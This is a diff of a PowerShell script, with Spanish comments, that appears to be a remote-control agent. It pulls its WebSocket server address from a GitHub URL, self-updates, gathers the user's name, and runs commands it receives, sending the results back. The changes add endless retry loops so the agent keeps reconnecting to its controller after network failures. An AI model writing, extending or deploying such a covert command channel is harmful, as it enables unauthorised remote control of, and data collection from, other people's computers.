@@ -24,19 +24,22 @@ Add-Type -AssemblyName System.Windows.Forms
 
 # --- OBTENER URI DESDE GITHUB ---
 $uri = $null
-try {
-    Write-Host "Obteniendo WebSocket URI desde $UriConfigUrl..."
-    # Usar -UseBasicParsing para Invoke-RestMethod en entornos sin Internet Explorer
-    $uri = Invoke-RestMethod -Uri $UriConfigUrl -UseBasicParsing -TimeoutSec 10
-    $uri = $uri.Trim()
-    if ([string]::IsNullOrWhiteSpace($uri)) {
-        throw "La URI obtenida está vacía o es nula."
+while ($true) {
+    try {
+        Write-Host "Obteniendo WebSocket URI desde $UriConfigUrl..."
+        # Usar -UseBasicParsing para Invoke-RestMethod en entornos sin Internet Explorer
+        $uri = Invoke-RestMethod -Uri $UriConfigUrl -UseBasicParsing -TimeoutSec 10
+        $uri = $uri.Trim()
+        if ([string]::IsNullOrWhiteSpace($uri)) {
+            throw "La URI obtenida está vacía o nula."
+        }
+        Write-Host "URI cargada: $uri"
+        break
+    } catch {
+        Write-Warning "No se pudo obtener la URI del WebSocket. Error: $($_.Exception.Message)"
+        Write-Host "Esperando conexión de red... reintentando en 10 segundos."
+        Start-Sleep -Seconds 10
     }
-    Write-Host "URI cargada: $uri"
-} catch {
-    Write-Error "No se pudo obtener la URI del WebSocket. Error: $($_.Exception.Message)"
-    # Si no podemos obtener la URI, no podemos continuar. Salimos.
-    Exit
 }
 
 # --- FUNCIÓN DE AUTO-UPDATER ---
@@ -104,8 +107,19 @@ function Update-Script {
 }
 
 # Connect WebSocket
-$ws = New-Object System.Net.WebSockets.ClientWebSocket
-$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
+while ($true) {
+    $ws = New-Object System.Net.WebSockets.ClientWebSocket
+    try {
+        Write-Host "Conectando al WebSocket..."
+        $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
+        Write-Host "Conexión WebSocket establecida."
+        break
+    } catch {
+        Write-Warning "No se pudo conectar al WebSocket. Error: $($_.Exception.Message)"
+        Write-Host "Esperando red y reintentando en 10 segundos."
+        Start-Sleep -Seconds 10
+    }
+}
 
 # System data
 $user = $env:USERNAME
@@ -253,6 +267,7 @@ try {
         } catch {
             Send-Back "[comando inválido o error ejecutando comando]"
         }
+    }
     }
 }
 finally {
